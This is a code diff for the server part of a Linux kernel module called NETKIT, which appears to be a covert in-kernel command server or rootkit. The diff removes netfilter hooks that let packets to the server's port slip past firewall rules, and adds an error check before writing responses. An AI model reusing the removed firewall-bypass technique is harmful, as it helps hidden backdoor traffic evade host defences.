@@ -15,8 +15,6 @@
 
 #include "server.h"
 
-#include "../../core/cmd/cmd.h"
-#include "../../core/packet/packet.h"
 #include "../../sys/mem.h"
 #include "../../sys/socket.h"
 #include "../../sys/debug.h"
@@ -33,39 +31,6 @@ static struct kref active_conns;
 DECLARE_WAIT_QUEUE_HEAD(all_conns_handled_wait_queue);
 static struct task_struct *task_conn_loop = NULL;
 
-static unsigned int nf_hook_in_bypass(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
-{    
-    if (skb->protocol != htons(ETH_P_IP) || ip_hdr(skb)->protocol != IPPROTO_TCP || \
-            skb->len < ip_hdr(skb)->ihl * 4 + sizeof(struct tcphdr) || ntohs(tcp_hdr(skb)->dest) != SERVER_PORT)
-        return NF_ACCEPT;
-
-    NETKIT_LOG("[*] bypassing netfilter...\n");
-
-    refcount_inc(&skb->users);  // incr refc so skb doesn't get free'd when ip_recv_final needs it
-    return NF_DROP | (0xFFFF << 16);  // -(retv >> 16) == 1
-}
-static unsigned int nf_hook_out_bypass(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
-{
-    // allow all out    
-    //refcount_inc(&skb->users);
-    //return NF_DROP | (0xFFFF << 16);
-    return NF_ACCEPT;
-}
-
-static struct nf_hook_ops nfho_in_bypass = {
-    .hook = nf_hook_in_bypass,
-    .pf = PF_INET,
-    .hooknum = NF_INET_LOCAL_IN,
-    .priority = NF_IP_PRI_FIRST,
-};
-
-static struct nf_hook_ops nfho_out_bypass = {
-    .hook = nf_hook_out_bypass,
-    .pf = PF_INET,
-    .hooknum = NF_INET_LOCAL_OUT,
-    .priority = NF_IP_PRI_FIRST,
-};
-
 static int server_conn_handler(void *args)
 {
     struct server_conn *packet = (struct server_conn*)args;
@@ -77,7 +42,10 @@ static int server_conn_handler(void *args)
 
     NETKIT_LOG("[*] calling io_process (req_buflen: %lu)...\n", packet->req_buflen);
     retv = io_process(packet->req_buf, packet->req_buflen, &res_buf, &res_buflen);
-    retv = socket_write(packet->client_sk, res_buf, res_buflen);
+
+    // if io_process failed, do not write to socket
+    if (retv >= 0)
+        retv = socket_write(packet->client_sk, res_buf, res_buflen);
 
     sock_release(packet->client_sk);
     kzfree(packet->req_buf, packet->req_buflen);
@@ -199,10 +167,6 @@ LAB_OUT_NO_SOCK:
  */
 int server_init(void)
 {
-    // current->nsproxy->net_ns
-    nf_register_net_hook(current->nsproxy->net_ns, &nfho_in_bypass);
-    nf_register_net_hook(current->nsproxy->net_ns, &nfho_out_bypass);
-
     NETKIT_LOG("[*] starting server_conn_loop...\n");
 
     task_conn_loop = kthread_run(server_conn_loop, NULL, KTHREAD_LOOP_NAME);
@@ -222,10 +186,6 @@ int server_exit(void)
     int retv;
 
     NETKIT_LOG("[*] trying to shutdown IO server...\n");
-
-    nf_unregister_net_hook(current->nsproxy->net_ns, &nfho_in_bypass);
-    nf_unregister_net_hook(current->nsproxy->net_ns, &nfho_out_bypass);
-
     if (!task_conn_loop)
     {
         NETKIT_LOG("[!] task loop does not exist when exiting\n");
